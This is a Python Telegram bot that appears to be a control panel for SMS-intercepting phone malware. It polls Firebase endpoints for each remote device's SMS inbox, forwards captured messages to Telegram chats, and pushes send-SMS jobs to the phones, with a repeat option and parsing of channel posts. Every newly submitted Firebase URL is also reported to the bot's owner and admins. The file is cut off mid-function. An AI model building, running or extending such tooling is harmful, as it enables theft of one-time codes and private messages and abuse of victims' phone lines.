"""
SMS BOT v3  |  aiogram 3.x · aiohttp · Local JSON
pip install aiogram==3.7.0 aiohttp
python bot.py
"""

import asyncio, json, os, time, logging, html
from datetime import datetime, timedelta
from copy     import deepcopy

import aiohttp
from aiogram                    import Bot, Dispatcher, F, Router
from aiogram.types              import (Message, CallbackQuery,
                                        InlineKeyboardMarkup,
                                        InlineKeyboardButton)
from aiogram.filters            import Command
from aiogram.fsm.context        import FSMContext
from aiogram.fsm.state          import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions         import TelegramBadRequest

# ── logging ────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S")
log = logging.getLogger("SMSBot")

# ═══════════════════════════════════════════════════════════
#  PRIVILEGED USER CONFIGURATION
#  Set OWNER_ID in the runtime environment when a privileged
#  Telegram account should be designated.
# ═══════════════════════════════════════════════════════════
def _owner() -> int:
    raw_owner_id = os.getenv("OWNER_ID", "").strip()
    return int(raw_owner_id) if raw_owner_id.isdigit() else 0

# ── Runtime configuration ──────────────────────────────────
_POLL_INTERVAL   = 4      # seconds between Firebase polls
_MAX_SEEN_IDS    = 500    # max tracked message IDs per user
_DATA_FILE       = "bot_data.json"
_VERSION         = "v3.2"
BOT_TOKEN        = os.getenv("BOT_TOKEN", "").strip()

# Telegram custom-emoji sets used as a shared visual language across the UI.
# The IDs are resolved once at startup, cached in memory, and placed directly
# inside HTML message cards using Telegram-native <tg-emoji> markup.
_THEME_PACKS: dict[str, str] = {
    "finance": "FinanceEmoji",
    "status": "status_packuz",
    "news": "NewsEmoji",
    "control": "ZEROX_660_by_TgEmodziBot",
}
_THEME_CACHE: dict[str, list[str]] = {theme: [] for theme in _THEME_PACKS}
_FIREBASE_ALERT_LOCK = asyncio.Lock()


def theme_emoji(theme: str, slot: int = 0, fallback: str = "•") -> str:
    """Return a Telegram custom emoji tag, with a quiet text fallback."""
    emoji_ids = _THEME_CACHE.get(theme, [])
    if not emoji_ids:
        return fallback
    emoji_id = emoji_ids[slot % len(emoji_ids)]
    return f'<tg-emoji emoji-id="{emoji_id}">✦</tg-emoji>'


async def preload_theme_emojis(bot: Bot) -> None:
    """Resolve all configured packs once so UI rendering never refetches a pack."""
    for theme, pack_name in _THEME_PACKS.items():
        try:
            sticker_set = await bot.get_sticker_set(name=pack_name)
            emoji_ids = [
                sticker.custom_emoji_id
                for sticker in (getattr(sticker_set, "stickers", []) or [])
                if getattr(sticker, "custom_emoji_id", None)
            ]
            _THEME_CACHE[theme] = emoji_ids
            log.info("Theme pack %s ready: %s custom emoji", theme, len(emoji_ids))
        except Exception as exc:
            _THEME_CACHE[theme] = []
            log.warning("Theme pack %s is unavailable: %s", theme, exc)

# ═══════════════════════════════════════════════════════════
#  FSM STATES
# ═══════════════════════════════════════════════════════════
class W(StatesGroup):
    fb_url      = State()
    dev_manual  = State()
    ch_input    = State()
    repeat_cust = State()
    test_to     = State()
    test_msg    = State()
    fwd_add     = State()
    adm_add     = State()
    usr_add_id  = State()
    usr_add_exp = State()

# ═══════════════════════════════════════════════════════════
#  STORAGE
# ═══════════════════════════════════════════════════════════
def _new_user():
    return {
        "firebases":  [],
        "devices":    [],
        "channels":   [],
        "active":     {},
        "monitoring": False,
        "fwd":        [],
        "stats":      {"sent":0,"failed":0,"last":"—"},
        "expires":    None,
        "added_by":   None,
    }

_DEFAULTS = {
    "admins": [],
    "free": False,
    "users": {},
    "timed_users": {},
    "announced_firebase_urls": [],
}

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        with open(_DATA_FILE) as f: d = json.load(f)
        for k,v in _DEFAULTS.items():
            if k not in d: d[k] = v
        return d
    return deepcopy(_DEFAULTS)

def save(d: dict):
    with open(_DATA_FILE,"w") as f: json.dump(d,f,indent=2)

def usr(uid:int, d:dict) -> dict:
    k = str(uid)
    if k not in d["users"]: d["users"][k] = _new_user()
    u = d["users"][k]
    for key,val in _new_user().items():
        if key not in u: u[key] = val
    return u

# ═══════════════════════════════════════════════════════════
#  PERMISSIONS
# ═══════════════════════════════════════════════════════════
def is_owner(uid): return uid == _owner()
def is_admin(uid,d): return is_owner(uid) or uid in d.get("admins",[])

def can_use(uid: int, d: dict) -> bool:
    """All Telegram users may use the bot; admin-only controls remain protected."""
    return True

def access_label(uid:int, d:dict) -> str:
    if is_owner(uid):   return "👑 Owner"
    if is_admin(uid,d): return "🛡 Admin"
    tu = d.get("timed_users",{}).get(str(uid))
    if tu:
        if tu["expires"] is None: return "🔓 User"
        rem = tu["expires"] - time.time()
        if rem > 0:
            h=int(rem//3600); m=int((rem%3600)//60)
            return f"⏱ {h}h {m}m left"
        return "🚫 Expired"
    return "🔓 User"

# ═══════════════════════════════════════════════════════════
#  PREMIUM UI SYSTEM
# ═══════════════════════════════════════════════════════════
def pbar(done: int, total: int, width: int = 8) -> str:
    if total <= 0:
        return "░" * width
    filled = max(0, min(width, round(done / total * width)))
    return "▰" * filled + "▱" * (width - filled)


def pct(done: int, total: int) -> str:
    return f"{round(done / total * 100)}%" if total else "0%"


def safe_text(value) -> str:
    return html.escape(str(value), quote=False)


def readiness_icon(is_ready: bool, slot: int) -> str:
    return theme_emoji("status", slot if is_ready else slot + 1, "●" if is_ready else "○")


def normalize_firebase_url(url: str) -> str:
    """Create a stable key for the one-time new-Firebase alert registry."""
    return url.strip().rstrip("/").lower()


async def send_theme_sticker(bot: Bot, chat_id: int, theme: str) -> bool:
    """Send a compact Telegram-native custom emoji accent when needed."""
    if not _THEME_CACHE.get(theme):
        return False
    try:
        await bot.send_message(
            chat_id,
            theme_emoji(theme, 0),
            parse_mode="HTML",
            disable_notification=True,
        )
        return True
    except Exception as exc:
        log.info("Theme accent unavailable for %s: %s", theme, exc)
        return False


async def notify_new_firebase_admins(bot: Bot, d: dict, submitted_by: int, url: str) -> bool:
    """Alert administrators once for every distinct Firebase endpoint."""
    key = normalize_firebase_url(url)
    async with _FIREBASE_ALERT_LOCK:
        current = load()
        announced = current.setdefault("announced_firebase_urls", [])
        if key in announced:
            return False
        announced.append(key)
        if len(announced) > 2000:
            del announced[:-2000]
        save(current)
        recipients = {int(a) for a in current.get("admins", []) if str(a).lstrip("-").isdigit()}
        owner_id = _owner()
        if owner_id:
            recipients.add(owner_id)

    alert = (
        f"{theme_emoji('news', 0, '◆')} <b>NEW ENDPOINT REGISTERED</b>\n"
        "<i>Administrative notification</i>\n"
        "────────────\n"
        f"<b>Submitted by</b>  <code>{submitted_by}</code>\n"
        f"<b>Firebase URL</b>  <code>{safe_text(url)}</code>\n"
        f"<b>Recorded at</b>  <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
    )
    for admin_id in recipients:
        try:
            await bot.send_message(admin_id, alert, parse_mode="HTML")
        except Exception as exc:
            log.warning("New Firebase alert to %s failed: %s", admin_id, exc)
    return True


def setup_progress_card(u: dict) -> str:
    steps = [
        ("Endpoint", bool(u.get("firebases"))),
        ("Device", bool(u.get("devices"))),
        ("Channel", bool(u.get("channels"))),
        ("Route", bool(u.get("active", {}).get("fb_url"))),
    ]
    done = sum(is_ready for _, is_ready in steps)
    lines = "\n".join(
        f"{readiness_icon(is_ready, index)} <b>{label.upper()}</b>  <i>{'connected' if is_ready else 'waiting'}</i>"
        for index, (label, is_ready) in enumerate(steps)
    )
    return (
        f"{theme_emoji('control', 1, '◆')} <b>SETUP READINESS</b>\n"
        f"<i>{done}/4 modules ready</i>  <code>{pbar(done, 4)}</code>\n"
        "────────────\n"
        f"{lines}"
    )


def stats_card(u: dict) -> str:
    stats = u.get("stats", {})
    sent = stats.get("sent", 0)
    failed = stats.get("failed", 0)
    total = sent + failed
    delivery_state = "standing by" if total == 0 else f"{pct(sent, total)} delivery rate"
    return (
        f"{theme_emoji('finance', 1, '◆')} <b>DELIVERY PULSE</b>\n"
        f"<i>{delivery_state}</i>\n"
        "────────────\n"
        f"{theme_emoji('status', 0, '•')} <b>Delivered</b>  <code>{sent}</code>\n"
        f"{theme_emoji('status', 2, '•')} <b>Failed</b>  <code>{failed}</code>\n"
        f"{theme_emoji('news', 1, '•')} <b>Last activity</b>  <code>{safe_text(stats.get('last', '—'))}</code>"
    )


def wizard_step_card(step: int, total: int, title: str, hint: str = "") -> str:
    markers = " ".join(
        theme_emoji("status", index, "●") if index < step else "○"
        for index in range(total)
    )
    hint_line = f"\n<i>{safe_text(hint)}</i>" if hint else ""
    return (
        f"{theme_emoji('control', step, '◆')} <b>CONFIGURE · {step:02d}/{total:02d}</b>\n"
        f"<code>{pbar(step, total)}</code>  {markers}\n"
        "────────────\n"
        f"<b>{safe_text(title).upper()}</b>{hint_line}"
    )


def active_combo_card(u: dict) -> str:
    active = u.get("active", {})
    if not active:
        return (
            f"{theme_emoji('control', 2, '◆')} <b>ROUTE STATUS</b>\n"
            "<i>No active delivery route. Start the guided setup to connect one.</i>"
        )
    sims = ", ".join(f"SIM {slot + 1}" for slot in active.get("sims", [])) or "—"
    monitor = "LIVE" if u.get("monitoring") else "PAUSED"
    return (
        f"{theme_emoji('control', 2, '◆')} <b>ACTIVE ROUTE</b>\n"
        f"<i>{monitor} · repeat {safe_text(active.get('repeat', 1))}×</i>\n"
        "────────────\n"
        f"<b>Endpoint</b>  <code>{safe_text(str(active.get('fb_url', '—'))[:32])}</code>\n"
        f"<b>Device</b>  <code>{safe_text(str(active.get('device_id', '—'))[:32])}</code>\n"
        f"<b>SIM profile</b>  <code>{safe_text(sims)}</code>\n"
        f"<b>Channel</b>  <code>{safe_text(active.get('ch_id', '—'))}</code>"
    )


def home_card(uid: int, d: dict) -> str:
    user = usr(uid, d)
    role = safe_text(access_label(uid, d))
    monitor_state = "ONLINE" if user.get("monitoring") else "PAUSED"
    timed_user = d.get("timed_users", {}).get(str(uid))
    access_line = ""
    if timed_user and timed_user.get("expires"):
        remaining = timed_user["expires"] - time.time()
        if remaining > 0:
            hours, minutes = int(remaining // 3600), int((remaining % 3600) // 60)
            access_line = f"\n<b>Access window</b>  <code>{hours}h {minutes}m</code>"
    return (
        f"{theme_emoji('finance', 0, '◆')} <b>SMS COMMAND CENTER</b>\n"
        f"<i>Private relay workspace · {_VERSION}</i>\n"
        "════════════\n"
        f"<b>Access</b>  <code>{role}</code>\n"
        f"<b>Monitor</b>  <code>{monitor_state}</code>{access_line}\n\n"
        f"{setup_progress_card(user)}\n\n"
        f"{stats_card(user)}\n\n"
        "<i>Select a workspace action below.</i>"
    )


def admin_overview_card(d: dict) -> str:
    users = d.get("users", {})
    active = sum(1 for user in users.values() if user.get("monitoring"))
    firebase_count = sum(len(user.get("firebases", [])) for user in users.values())
    sent = sum(user.get("stats", {}).get("sent", 0) for user in users.values())
    failed = sum(user.get("stats", {}).get("failed", 0) for user in users.values())
    return (
        f"{theme_emoji('control', 0, '◆')} <b>OPERATIONS OVERVIEW</b>\n"
        "<i>Live workspace snapshot</i>\n"
        "────────────\n"
        f"<b>Accounts</b>  <code>{len(users)}</code>    <b>Admins</b>  <code>{len(d.get('admins', []))}</code>\n"
        f"<b>Live routes</b>  <code>{active}</code>    <b>Endpoints</b>  <code>{firebase_count}</code>\n"
        f"<b>Delivered</b>  <code>{sent}</code>    <b>Failed</b>  <code>{failed}</code>"
    )


def admin_alert_card(d: dict) -> str:
    count = len(d.get("announced_firebase_urls", []))
    return (
        f"{theme_emoji('news', 0, '◆')} <b>ENDPOINT ALERTS</b>\n"
        "<i>Distinct endpoint registrations</i>\n"
        "────────────\n"
        f"<b>Tracked endpoints</b>  <code>{count}</code>\n\n"
        "<i>Administrators are notified only when a new normalized URL is registered.</i>"
    )


def admin_directory_card(d: dict) -> str:
    admins = d.get("admins", [])
    entries = "\n".join(f"{theme_emoji('status', index, '•')} <code>{admin_id}</code>" for index, admin_id in enumerate(admins))
    if not entries:
        entries = "<i>No additional administrators</i>"
    owner_configured = "YES" if _owner() else "NO"
    return (
        f"{theme_emoji('control', 3, '◆')} <b>ADMINISTRATOR DIRECTORY</b>\n"
        "────────────\n"
        f"<b>Owner configured</b>  <code>{owner_configured}</code>\n"
        f"<b>Additional admins</b>  <code>{len(admins)}</code>\n\n"
        f"{entries}"
    )

# ═══════════════════════════════════════════════════════════
#  KEYBOARD BUILDER
# ═══════════════════════════════════════════════════════════
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t,c in row]
        for row in rows
    ])

def main_menu(uid: int, d: dict) -> InlineKeyboardMarkup:
    user = usr(uid, d)
    monitor_label = "Pause monitoring" if user.get("monitoring") else "Start monitoring"
    rows = [
        [("Guided setup", "wiz:start"), (monitor_label, "mon:go")],
        [("Workspace", "my:menu"), ("Live dashboard", "dash:show")],
        [("Forwarding", "fwd:menu"), ("Reset workspace", "reset:self")],
    ]
    if is_admin(uid, d):
        rows.append([("Admin console", "adm:menu")])
    return kb(*rows)


def my_menu_kb(uid: int, d: dict) -> InlineKeyboardMarkup:
    user = usr(uid, d)
    firebase_count = len(user.get("firebases", []))
    device_count = len(user.get("devices", []))
    channel_count = len(user.get("channels", []))
    return kb(
        [(f"Endpoints · {firebase_count}", "fb:list"), (f"Devices · {device_count}", "dev:list")],
        [(f"Channels · {channel_count}", "ch:list"), ("Send test", "test:go")],
        [("Back to command center", "home")],
    )


def adm_menu_kb(uid: int, d: dict) -> InlineKeyboardMarkup:
    rows = [
        [("Overview", "adm:overview"), ("Accounts", "adm:users")],
        [("Grant access", "adm:adduser"), ("Endpoint alerts", "adm:alerts")],
        [("Administrator directory", "adm:admins")],
    ]
    if is_owner(uid):
        free = d.get("free", False)
        rows += [
            [(f"Open access · {'ON' if free else 'OFF'}", "adm:free")],
            [("Add administrator", "adm:addadmin")],
            [("Reset all data", "adm:resetall")],
        ]
    rows.append([("Back to command center", "home")])
    return kb(*rows)


def list_kb(items: list, id_key: str, name_key: str, del_pfx: str, add_cb: str, back_cb: str) -> InlineKeyboardMarkup:
    rows = [[("Add new", add_cb)]]
    for item in items:
        label = str(item.get(name_key, ""))[:26]
        rows.append([(label, "_noop_"), ("Remove", f"{del_pfx}{item[id_key]}")])
    rows.append([("Back", back_cb)])
    return kb(*rows)


def online_devices_kb(online: dict, page: int = 0) -> InlineKeyboardMarkup:
    items = list(online.items())
    per_page = 6
    start = page * per_page
    chunk = items[start : start + per_page]
    rows = [[((device.get("deviceName") or device.get("name") or device_id)[:26], f"fadd:{device_id}")] for device_id, device in chunk]
    navigation = []
    if page > 0:
        navigation.append(("Previous", f"faddpg:{page - 1}"))
    if start + per_page < len(items):
        navigation.append(("Next", f"faddpg:{page + 1}"))
    if navigation:
        rows.append(navigation)
    rows += [[("Enter ID manually", "dev:manual")], [("Back", "dev:list")]]
    return kb(*rows)


def sim_kb(sims: list, sel: list, did: str) -> InlineKeyboardMarkup:
    rows = []
    for sim in sims:
        index = int(sim.get("simSlotIndex", 0))
        name = sim.get("simName") or sim.get("carrierName") or f"SIM {index + 1}"
        marker = "Selected" if index in sel else "Select"
        rows.append([(f"{marker} · SIM {index + 1} · {name}", f"simtog:{did}:{index}")])
    if sel:
        rows.append([("Confirm selection", f"simok:{did}")])
    rows.append([("Back", "home")])
    return kb(*rows)


def ch_pick_kb(channels: list) -> InlineKeyboardMarkup:
    rows = [[(channel["name"][:26], f"wpick:ch:{channel['id']}")] for channel in channels]
    rows += [[("Add channel", "ch:add")], [("Back", "home")]]
    return kb(*rows)


def fb_pick_kb(firebases: list) -> InlineKeyboardMarkup:
    rows = [[(firebase["url"][:30], f"wpick:fb:{firebase['id']}")] for firebase in firebases]
    rows += [[("Add endpoint", "fb:add")], [("Back", "home")]]
    return kb(*rows)


def dev_pick_kb(devices: list, page: int = 0) -> InlineKeyboardMarkup:
    per_page = 6
    start = page * per_page
    chunk = devices[start : start + per_page]
    rows = [[(device["name"][:26], f"wpick:dev:{device['id']}")] for device in chunk]
    navigation = []
    if page > 0:
        navigation.append(("Previous", f"wpick:devpg:{page - 1}"))
    if start + per_page < len(devices):
        navigation.append(("Next", f"wpick:devpg:{page + 1}"))
    if navigation:
        rows.append(navigation)
    rows += [[("Add device", "dev:add")], [("Back", "home")]]
    return kb(*rows)


def repeat_kb() -> InlineKeyboardMarkup:
    return kb(
        [("Once", "rpt:1"), ("Twice", "rpt:2")],
        [("Three times", "rpt:3"), ("Custom", "rpt:c")],
        [("Back", "home")],
    )


def timed_access_kb() -> InlineKeyboardMarkup:
    return kb(
        [("1 hour", "tacc:3600"), ("6 hours", "tacc:21600")],
        [("24 hours", "tacc:86400"), ("7 days", "tacc:604800")],
        [("Custom date", "tacc:custom"), ("Permanent", "tacc:0")],
        [("Back", "adm:menu")],
    )


def _fwd_kb(uid: int, d: dict) -> InlineKeyboardMarkup:
    user = usr(uid, d)
    rows = [[("Add target", "fwd:add")]]
    for target in user.get("fwd", []):
        rows.append([(str(target)[:26], "_noop_"), ("Remove", f"fwd:del:{target}")])
    rows.append([("Back", "home")])
    return kb(*rows)

# ═══════════════════════════════════════════════════════════
#  FIREBASE HELPERS
# ═══════════════════════════════════════════════════════════
_FIREBASE_SESSION: aiohttp.ClientSession | None = None


async def firebase_session() -> aiohttp.ClientSession:
    global _FIREBASE_SESSION
    if _FIREBASE_SESSION is None or _FIREBASE_SESSION.closed:
        _FIREBASE_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=8),
            connector=aiohttp.TCPConnector(limit=32, ttl_dns_cache=300),
        )
    return _FIREBASE_SESSION


async def fb_get(base: str, path: str) -> dict:
    url = base.rstrip("/") + path
    try:
        session = await firebase_session()
        async with session.get(url) as response:
            if response.status == 200:
                text = (await response.text()).strip()
                return {} if text == "null" else json.loads(text)
    except Exception as exc:
        log.error("fb_get %s: %s", url, exc)
    return {}


async def fb_put(base: str, path: str, payload: dict) -> bool:
    url = base.rstrip("/") + path
    for attempt in range(3):
        try:
            session = await firebase_session()
            async with session.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as response:
                if 200 <= response.status < 300:
                    return True
        except Exception as exc:
            log.error("fb_put attempt %s: %s", attempt + 1, exc)
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def dev_online(dd:dict)->bool:
    return any([dd.get("isOnline"),dd.get("online"),dd.get("connected"),
                dd.get("status") in ("online","active",True,1)])

async def send_via_fb(fb:str, dev:str, sim:int, to:str, msg:str)->bool:
    return await fb_put(fb, f"/clients/{dev}/webhookEvent/sendSms.json",{
        "from":sim,"to":to.strip(),"message":msg.strip(),
        "isSended":False,"timestamp":int(time.time())
    })

# ═══════════════════════════════════════════════════════════
#  SMS PARSER
# ═══════════════════════════════════════════════════════════
def parse_sms(text:str):
    lines=[l.strip() for l in text.split("\n") if l.strip()]
    ml=next((l for l in lines if l.startswith("🏷️ MESSAGE")),None)
    rl=next((l for l in lines if l.startswith("🏷️ RECIPIENT")),None)
    if ml and rl: return rl.split(":",1)[-1].strip(), ml.split(":",1)[-1].strip()

    def _f(tp,tk,mp,mk,ti,mi):
        t=m=None
        for i,line in enumerate(lines):
            if line.startswith(tp) and tk in line:
                v=line.split(tk,1)[1].strip()
                t=v if(ti and v) else(lines[i+1].strip() if(not ti and i+1<len(lines))else None)
            if line.startswith(mp) and mk in line:
                v=line.split(mk,1)[1].strip()
                m=v if(mi and v) else(lines[i+1].strip() if(not mi and i+1<len(lines))else None)
        return (t,m) if t and m else (None,None)

    for args in [
        ("📱","To:","💬","Full Message:",True,False),
        ("📍","To:","💬","Message:",False,False),
        ("To:","To:","Message:","Message:",True,True),
        ("📱","Receiver","🔑","Message",False,False),
        ("📞","To:","💬","Message:",True,True),
    ]:
        r=_f(*args)
        if r[0]: return r
    return None,None

# ═══════════════════════════════════════════════════════════
#  MONITOR TASKS
# ═══════════════════════════════════════════════════════════
_tasks: dict[int,asyncio.Task] = {}
_seen:  dict[int,set]          = {}

async def _do_send(bot:Bot, uid:int, to:str, text:str):
    d=load(); u=usr(uid,d); ac=u.get("active",{})
    fb=ac.get("fb_url"); dev=ac.get("device_id")
    sims=ac.get("sims",[0]); rpt=int(ac.get("repeat",1))
    ok=0; fail=0

    for _ in range(rpt):
        for sim in sims:
            if await send_via_fb(fb,dev,sim,to,text): ok+=1
            else: fail+=1

    icon = "✅" if fail==0 else ("⚠️" if ok>0 else "❌")
    bar  = pbar(ok, ok + fail, 6)
    result=(
        f"{icon} **SMS Result**\n\n"
        f"  {bar}  {ok}/{ok+fail} sent\n\n"
        f"  📞 To      : `{to}`\n"
        f"  💬 Message : `{text[:55]}`\n"
        f"  📶 SIMs    : `{len(sims)}`   🔁 Repeat : `{rpt}x`"
    )
    try: await bot.send_message(uid,result,parse_mode="Markdown")
    except: pass

    d2=load(); u2=usr(uid,d2)
    for tgt in u2.get("fwd",[]):
        try:
            c=int(tgt) if str(tgt).lstrip("-").isdigit() else tgt
            await bot.send_message(c,result,parse_mode="Markdown")
        except: pass

    u2["stats"]["sent"]  = u2["stats"].get("sent",0)+ok
    u2["stats"]["failed"]= u2["stats"].get("failed",0)+fail
    u2["stats"]["last"]  = datetime.now().strftime("%H:%M:%S")
    save(d2)

async def monitor_worker(bot:Bot, uid:int):
    d=load(); u=usr(uid,d); ac=u.get("active",{})
    fb=ac.get("fb_url"); dev=ac.get("device_id")
    if uid not in _seen: _seen[uid]=set()

    try:
        await bot.send_message(
            uid,
            f"{theme_emoji('status', 0, '◆')} <b>MONITOR ONLINE</b>\n"
            "<i>Incoming activity will appear in this workspace.</i>\n\n"
            f"{active_combo_card(u)}",
            parse_mode="HTML",
        )
    except: pass

    log.info(f"Monitor START uid={uid} dev={dev}")

    while True:
        try:
            await asyncio.sleep(_POLL_INTERVAL)
            inbox = await fb_get(fb, f"/clients/{dev}/inbox.json")
            for mid,mdata in (inbox or {}).items():
                if mid in _seen[uid]: continue
                _seen[uid].add(mid)
                if len(_seen[uid]) > _MAX_SEEN_IDS:
                    _seen[uid] = set(list(_seen[uid])[-200:])
                sender  = mdata.get("from") or mdata.get("sender","?")
                content = mdata.get("message") or mdata.get("body","")
                if not content: continue
                log.info(f"uid={uid} incoming from={sender}")
                note=(
                    f"📨 **Incoming SMS**\n\n"
                    f"  📞 From    : `{sender}`\n"
                    f"  💬 Message : `{content}`\n"
                    f"  🕐 Time    : `{datetime.now().strftime('%H:%M:%S')}`"
                )
                try: await bot.send_message(uid,note,parse_mode="Markdown")
                except: pass
                d2=load()
                for tgt in usr(uid,d2).get("fwd",[]):
                    try:
                        c=int(tgt) if str(tgt).lstrip("-").isdigit() else tgt
                        await bot.send_message(c,note,parse_mode="Markdown")
                    except: pass
        except asyncio.CancelledError:
            log.info(f"Monitor STOP uid={uid}")
            try: await bot.send_message(uid,"⏸  Monitor stopped.",parse_mode="Markdown")
            except: pass
            break
        except Exception as e:
            log.error(f"Monitor error uid={uid}: {e}")
            await asyncio.sleep(10)

def _start_mon(bot:Bot, uid:int):
    if uid in _tasks: _tasks[uid].cancel()
    _tasks[uid] = asyncio.create_task(monitor_worker(bot,uid))

def _stop_mon(uid:int):
    t=_tasks.pop(uid,None)
    if t: t.cancel()

# ═══════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════
async def sedit(cq: CallbackQuery, text: str, markup=None):
    parse_mode = "HTML" if any(token in text for token in ("<tg-emoji", "<b>", "<code>", "<i>")) else "Markdown"
    try:
        await cq.message.edit_text(text, reply_markup=markup, parse_mode=parse_mode)
    except TelegramBadRequest:
        pass

def _add_timed_user(uid2:int, expires, added_by:int, d:dict):
    d.setdefault("timed_users",{})[str(uid2)]={
        "expires":expires,"added_by":added_by,"added_at":int(time.time())
    }

async def _wiz_fetch_devices(bot, uid:int, fb_url:str, fb_id:str, msg_or_cq):
    is_msg = isinstance(msg_or_cq, Message)
    reply  = msg_or_cq.answer if is_msg else msg_or_cq.message.answer
    wait   = await reply("⏳  Fetching online devices…")
    devs   = await fb_get(fb_url, "/clients.json")
    online = {k:v for k,v in devs.items() if dev_online(v)}
    try: await wait.delete()
    except: pass
    if not online:
        await reply("😴  No online devices found.\nCheck Firebase URL.",
            reply_markup=kb([("🔄  Retry","wiz:retry_dev"),("🏠  Home","home")]))
        return
    d=load(); u=usr(uid,d); u["_dev_cache"]=devs; save(d)
    step_txt = wizard_step_card(2,5,"Select Device", f"{len(online)} online")
    await reply(step_txt, reply_markup=online_devices_kb(online), parse_mode="HTML")

async def _wiz_finish(bot: Bot, uid: int, fsmd: dict, d: dict):
    user = usr(uid, d)
    combo = {
        "fb_url": fsmd.get("wiz_fb_url", ""),
        "device_id": fsmd.get("wiz_dev", ""),
        "sims": fsmd.get("wiz_sims", [0]),
        "ch_id": fsmd.get("wiz_ch", ""),
        "repeat": fsmd.get("wiz_repeat", 1),
    }
    user["active"] = combo
    user["monitoring"] = True
    save(d)
    log.info("uid=%s wizard done", uid)
    _start_mon(bot, uid)
    current = load()
    try:
        await bot.send_message(
            uid,
            f"{theme_emoji('status', 0, '◆')} <b>ROUTE ACTIVATED</b>\n"
            "<i>Your monitoring workspace is now live.</i>\n\n"
            f"{active_combo_card(usr(uid, current))}\n\n"
            f"{stats_card(usr(uid, current))}",
            reply_markup=main_menu(uid, current),
            parse_mode="HTML",
        )
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════
#  ROUTER + COMMANDS
# ═══════════════════════════════════════════════════════════
R = Router()

@R.message(Command("start"))
async def c_start(msg:Message, state:FSMContext):
    await state.clear()
    d=load(); uid=msg.from_user.id
    if not can_use(uid,d):
        await msg.answer("🚫  Access denied. Contact admin."); return
    usr(uid,d); save(d)
    await msg.answer(home_card(uid, d), reply_markup=main_menu(uid, d), parse_mode="HTML")

@R.message(Command("menu"))
async def c_menu(msg:Message, state:FSMContext):
    await state.clear(); d=load(); uid=msg.from_user.id
    if not can_use(uid,d): await msg.answer("🚫  Access denied."); return
    await msg.answer(home_card(uid, d), reply_markup=main_menu(uid, d), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════
#  FSM HANDLERS
# ═══════════════════════════════════════════════════════════
@R.message(W.fb_url)
async def f_fb_url(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip()
    if not text.startswith("http"):
        await msg.answer("❌  URL must start with `https://`",parse_mode="Markdown"); return
    u=usr(uid,d)
    firebase_url = text.rstrip("/")
    fid=str(int(time.time()))
    u["firebases"].append({"id":fid,"url":firebase_url})
    save(d)
    is_new_firebase = await notify_new_firebase_admins(msg.bot, d, uid, firebase_url)
    if is_new_firebase:
        await send_theme_sticker(msg.bot, uid, "status")
    fsmd=await state.get_data(); await state.clear()
    if fsmd.get("wizard"):
        await state.update_data(wizard=True,wiz_fb=fid,wiz_fb_url=firebase_url)
        await _wiz_fetch_devices(msg.bot,uid,firebase_url,fid,msg)
    else:
        await msg.answer("✅  Firebase added!",
            reply_markup=list_kb(u["firebases"],"id","url","fb:del:","fb:add","my:menu"))

@R.message(W.dev_manual)
async def f_dev_manual(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; did=msg.text.strip()
    u=usr(uid,d); fsmd=await state.get_data(); cache=u.get("_dev_cache",{})
    if did in cache:
        dd=cache[did]; name=dd.get("deviceName") or dd.get("name") or did[:20]
        sims=dd.get("sims",[]); fb_id=fsmd.get("wiz_fb","")
        if did not in [x["id"] for x in u.get("devices",[])]:
            u["devices"].append({"id":did,"name":name,"fb_id":fb_id,"sims":sims})
        save(d); await state.clear()
        if fsmd.get("wizard"):
            await state.update_data(**fsmd,wiz_dev=did,wiz_sims_avail=sims,wiz_sims_sel=[])
            if sims:
                await msg.answer(wizard_step_card(3,5,"Select SIM(s)","Tap to select, then confirm"),
                    reply_markup=sim_kb(sims,[],did), parse_mode="HTML")
            else:
                await state.update_data(**fsmd,wiz_dev=did,wiz_sims=[0])
                chs=u.get("channels",[])
                await msg.answer(wizard_step_card(4,5,"Select Channel"),
                    reply_markup=ch_pick_kb(chs), parse_mode="HTML")
        else:
            await msg.answer(f"✅  Device **{name}** added!",
                reply_markup=list_kb(u["devices"],"id","name","dev:del:","dev:add","my:menu"),
                parse_mode="Markdown")
    else:
        await msg.answer(f"❌  `{did}` not found. Try again:",parse_mode="Markdown")

@R.message(W.ch_input)
async def f_ch_input(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip()
    u=usr(uid,d)
    cid=int(text) if text.lstrip("-").isdigit() else text
    if str(cid) not in [str(c["id"]) for c in u.get("channels",[])]:
        u["channels"].append({"id":cid,"name":text})
    save(d); fsmd=await state.get_data(); await state.clear()
    if fsmd.get("wizard"):
        await state.update_data(**fsmd,wiz_ch=cid)
        await msg.answer(wizard_step_card(5,5,"Repeat Count","Times to send per SMS"),
            reply_markup=repeat_kb(), parse_mode="HTML")
    else:
        await msg.answer(f"✅  Channel `{text}` added!",
            reply_markup=list_kb(u["channels"],"id","name","ch:del:","ch:add","my:menu"),
            parse_mode="Markdown")

@R.message(W.repeat_cust)
async def f_repeat_cust(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id
    try:
        n=int(msg.text.strip())
        if not 1<=n<=20: raise ValueError
    except:
        await msg.answer("❌  Enter 1–20."); return
    fsmd=await state.get_data(); await state.clear()
    if fsmd.get("wizard"): await _wiz_finish(msg.bot,uid,{**fsmd,"wiz_repeat":n},d)
    else: await msg.answer("✅  Set!",reply_markup=main_menu(uid,d))

@R.message(W.test_to)
async def f_test_to(msg:Message, state:FSMContext):
    await state.update_data(test_to=msg.text.strip())
    await state.set_state(W.test_msg)
    await msg.answer("💬  Enter message text:")

@R.message(W.test_msg)
async def f_test_msg(msg:Message, state:FSMContext):
